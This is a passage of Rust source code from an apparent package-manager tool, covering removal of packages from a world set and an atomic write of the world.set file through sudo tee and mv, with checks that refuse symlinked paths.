    for pkg in packages {
        // match on bare name regardless of whether user passed "repo/pkg" or "pkg"
        let bare = pkg.split('/').last().unwrap_or(pkg).to_string();
        if current_set.remove(&bare).is_some() {
            changed = true;
        }
    }

    if !changed { return; }

    let mut sorted: Vec<String> = current_set.into_values().collect();
    sorted.sort();
    write_world_set(&sorted);
}

/// Atomic write: tee to .tmp then mv to final path.
fn write_world_set(packages: &[String]) {
    if !is_safe_path(WORLD_SET_TMP) {
        eprintln!(">>> Refusing to write: {} is a symlink", WORLD_SET_TMP);
        return;
    }
    if !is_safe_path(WORLD_SET_FILE) {
        eprintln!(">>> Refusing to write: {} is a symlink", WORLD_SET_FILE);
        return;
    }

    // Remove stale tmp file
    let _ = Command::new(SUDO_BIN)
        .args([RM_BIN, "-f", WORLD_SET_TMP])
        .status();

    let write_ok = {
        let child_proc = Command::new(SUDO_BIN)
            .arg(TEE_BIN)
            .arg(WORLD_SET_TMP)
            .stdin(Stdio::piped())
            .stdout(Stdio::null())
            .spawn();

        match child_proc {
            Ok(mut child) => {
                if let Some(mut stdin) = child.stdin.take() {
                    for pkg in packages {
                        if let Err(e) = writeln!(stdin, "{}", pkg) {
                            eprintln!(">>> Error writing to world.set pipeline: {}", e);
                        }
                    }
                }
                match child.wait() {
                    Ok(s) if s.success() => true,
                    Ok(_) => { eprintln!(">>> Error: sudo tee exited with non-zero status."); false }
                    Err(e) => { eprintln!(">>> Error waiting for sudo tee: {}", e); false }
                }
            }
            Err(e) => { eprintln!(">>> Error: Failed to spawn sudo tee: {}", e); false }
        }
    };

    if !write_ok { return; }

    match Command::new(SUDO_BIN)
        .args([MV_BIN, WORLD_SET_TMP, WORLD_SET_FILE])
        .status()
    {
        Ok(s) if s.success() => println!(">>> world.set updated."),
        Ok(_) => eprintln!(">>> Error: sudo mv failed when finalizing world.set."),
        Err(e) => eprintln!(">>> Error: sudo mv could not be spawned: {}", e),
    }
}